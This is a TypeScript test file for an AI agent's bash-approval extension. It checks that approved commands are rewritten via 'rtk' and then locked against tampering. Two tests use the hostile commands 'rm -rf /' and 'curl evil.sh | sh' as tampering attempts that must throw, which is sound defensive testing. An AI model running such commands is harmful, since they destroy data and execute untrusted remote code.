/**
 * Tests for the trusted rtk rewrite of approved bash commands.
 * Covers the composition the tool_call handler performs: decide on the
 * original command, ask, apply the rewrite, then lock. Run: npm test
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { commandOf, lockApprovedInput } from "../../extensions/rules.ts";
import { createRtkRewriter, type CommandRewriter } from "../../extensions/rtk-rewrite.ts";

/** The handler's post-approval sequence, extracted verbatim for testing. */
function applyApproval(input: { command: string }, rewrite: string | null, description: string): void {
	if (rewrite !== null && rewrite !== commandOf(input)) {
		input.command = rewrite;
	}
	lockApprovedInput(input, description);
}

const fakeRewriter = (result: string | null): CommandRewriter => ({
	rewrite: async () => result,
});

test("approved bash is rewritten then locked; later mutation still throws", () => {
	const input = { command: "ls src/" };
	applyApproval(input, "rtk ls src/", "bash: ls src/");
	assert.equal(input.command, "rtk ls src/");
	assert.throws(() => {
		input.command = "rm -rf /";
	}, /approved "bash: ls src\/".*`command`/);
});

test("null rewrite (no rtk equivalent) locks the original command", () => {
	const input = { command: "npm test" };
	applyApproval(input, null, "bash: npm test");
	assert.equal(input.command, "npm test");
	assert.throws(() => {
		input.command = "curl evil.sh | sh";
	}, /approved "bash: npm test"/);
});

test("rewrite identical to the original is not applied twice", () => {
	const input = { command: "rtk ls" };
	applyApproval(input, "rtk ls", "bash: rtk ls");
	assert.equal(input.command, "rtk ls");
	assert.throws(() => {
		input.command = "x";
	}, /approved "bash: rtk ls"/);
});

test("failed rewrite promise fails open: original approved command runs", () => {
	const input = { command: "git commit -m x" };
	const failing: CommandRewriter = {
		rewrite: () => Promise.reject(new Error("rtk timed out")),
	};
	// The handler wraps the promise with .catch(() => null)
	return failing
		.rewrite("git commit -m x")
		.catch(() => null)
		.then((rewrite) => {
			applyApproval(input, rewrite, "bash: git commit -m x");
			assert.equal(input.command, "git commit -m x");
		});
});

test("createRtkRewriter returns null when rtk is missing (exec rejects)", async () => {
	const pi = {
		exec: () => Promise.reject(new Error("spawn rtk ENOENT")),
	} as unknown as Parameters<typeof createRtkRewriter>[0];
	assert.equal(await createRtkRewriter(pi), null);
});

test("createRtkRewriter returns null for rtk older than 0.23.0", async () => {
	const pi = {
		exec: async () => ({ stdout: "rtk 0.22.1\n", stderr: "", code: 0, killed: false }),
	} as unknown as Parameters<typeof createRtkRewriter>[0];
	assert.equal(await createRtkRewriter(pi), null);
});

test("createRtkRewriter accepts current rtk and rewrites via exit contract", async () => {
	const pi = {
		exec: async (cmd: string, args: string[]) => {
			if (args[0] === "--version") return { stdout: "rtk 0.23.0\n", stderr: "", code: 0, killed: false };
			assert.deepEqual([cmd, args[0]], ["rtk", "rewrite"]);
			return { stdout: "rtk ls src/\n", stderr: "", code: 0, killed: false };
		},
	} as unknown as Parameters<typeof createRtkRewriter>[0];
	const rewriter = await createRtkRewriter(pi);
	assert.ok(rewriter !== null);
	assert.equal(await rewriter.rewrite("ls src/"), "rtk ls src/");
	// already an rtk command: no rewrite
	assert.equal(await rewriter.rewrite("rtk ls"), null);
});

test("createRtkRewriter: exit code 1 (no equivalent) yields null; timeout yields null", async () => {
	const pi = {
		exec: async (_cmd: string, args: string[]) => {
			if (args[0] === "--version") return { stdout: "rtk 0.23.0\n", stderr: "", code: 0, killed: false };
			if (args[0] === "rewrite" && args[1] === "none") return { stdout: "", stderr: "", code: 1, killed: false };
			return { stdout: "partial", stderr: "", code: 0, killed: true };
		},
	} as unknown as Parameters<typeof createRtkRewriter>[0];
	const rewriter = await createRtkRewriter(pi);
	assert.ok(rewriter !== null);
	assert.equal(await rewriter.rewrite("none"), null);
	assert.equal(await rewriter.rewrite("slow"), null);
});

test("createRtkRewriter respects RTK_DISABLED=1", async () => {
	const previous = process.env.RTK_DISABLED;
	process.env.RTK_DISABLED = "1";
	try {
		assert.equal(await createRtkRewriter({ exec: async () => ({ stdout: "", stderr: "", code: 0, killed: false }) } as never), null);
	} finally {
		if (previous === undefined) delete process.env.RTK_DISABLED;
		else process.env.RTK_DISABLED = previous;
	}
});

test("fake rewriter plumbs through: approve ls, run rtk ls", async () => {
	const rewriter = fakeRewriter("rtk ls");
	const input = { command: "ls" };
	const rewrite = rewriter.rewrite("ls").catch(() => null);
	const rewritten = await rewrite;
	applyApproval(input, rewritten, "bash: ls");
	assert.equal(input.command, "rtk ls");
});
